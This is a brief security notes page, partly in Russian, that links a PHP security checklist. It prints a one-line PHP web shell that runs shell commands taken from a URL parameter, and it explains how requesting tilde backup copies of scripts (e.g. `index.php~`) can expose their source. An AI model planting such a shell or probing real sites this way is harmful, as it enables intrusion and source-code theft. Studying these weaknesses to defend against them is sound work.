# Security

[https://github.com/ismailtasdelen/php-security-check-list](https://github.com/ismailtasdelen/php-security-check-list)

```
<? passthru($_GET["cmd"]);
```

Системы бэкапа иногда сохраняют копии файлов при редактировании. В PHP доставляется тильда. Например, если на сайте есть скрипт `/custom/index.php`, можно попробовать обратиться через тильду к нему как к текстовику: `/custom/index.php~`.
